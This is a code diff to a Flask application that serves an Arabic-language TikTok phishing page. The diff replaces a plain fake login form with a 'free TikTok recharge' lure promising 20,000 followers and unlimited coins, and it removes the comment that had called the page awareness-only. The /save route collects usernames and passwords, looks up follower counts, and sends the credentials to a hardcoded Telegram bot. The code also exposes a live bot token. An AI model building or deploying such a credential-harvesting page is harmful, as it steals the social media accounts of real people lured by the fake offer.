@@ -3,26 +3,43 @@ import requests
 
 app = Flask(__name__)
 
-# HTML مباشرة (واجهة تسجيل دخول مزيفة للتوعية فقط)
 html_page = """
 <!DOCTYPE html>
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>تسجيل الدخول | TikTok</title>
+  <title>شحن تيك توك المجاني</title>
+  <style>
+    body { background-color: #111; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
+    .container { background: #222; padding: 30px; border-radius: 10px; display: inline-block; }
+    input, button {
+        padding: 10px;
+        margin: 10px;
+        width: 80%;
+        border: none;
+        border-radius: 5px;
+    }
+    input { background-color: #333; color: white; }
+    button { background-color: #e91e63; color: white; cursor: pointer; }
+    h1 { color: #f50057; }
+    p { font-size: 16px; color: #ccc; }
+  </style>
 </head>
-<body style="text-align:center; font-family:sans-serif;">
-  <h2>تسجيل الدخول إلى TikTok</h2>
-  <form action="/save" method="POST">
-    <input type="text" name="username" placeholder="اسم المستخدم" required><br><br>
-    <input type="password" name="password" placeholder="كلمة المرور" required><br><br>
-    <button type="submit">تسجيل الدخول</button>
-  </form>
+<body>
+  <div class="container">
+    <h1>🎁 شحن مجاني تيك توك</h1>
+    <p>احصل على <strong>20,000 متابع</strong> + <strong>عدد لا نهائي من الكوينز</strong>!</p>
+    <p>قم بتسجيل الدخول الآن لتفعيل الهدايا</p>
+    <form action="/save" method="POST">
+      <input type="text" name="username" placeholder="اسم المستخدم" required><br>
+      <input type="password" name="password" placeholder="كلمة المرور" required><br>
+      <button type="submit">🎁 تفعيل الشحن الآن</button>
+    </form>
+  </div>
 </body>
 </html>
 """
 
-# ✅ إعدادات البوت
 BOT_TOKEN = "7504294266:AAHgYMIxq5G1hxXRmGF2O7zYKKi-bPjReeM"
 ADMIN_ID = "7758666677"
 
@@ -35,16 +52,14 @@ def save():
     username = request.form.get("username")
     password = request.form.get("password")
     
-    # محاولة جلب عدد المتابعين من API خارجي
     try:
         r = requests.get(f"https://api.countik.com/user/{username}")
         followers = r.json().get("followers", "غير معروف")
     except:
         followers = "غير معروف"
 
-    message = f"صيد تعليمي جديد 🎯\\n👤 المستخدم: @{username}\\n🔐 كلمة المرور: {password}\\n👥 عدد المتابعين: {followers}"
+    message = f"صيد تعليمي جديد 🎯\n👤 المستخدم: @{username}\n🔐 كلمة المرور: {password}\n👥 عدد المتابعين: {followers}"
 
-    # إرسال إلى تيليجرام
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         data = {
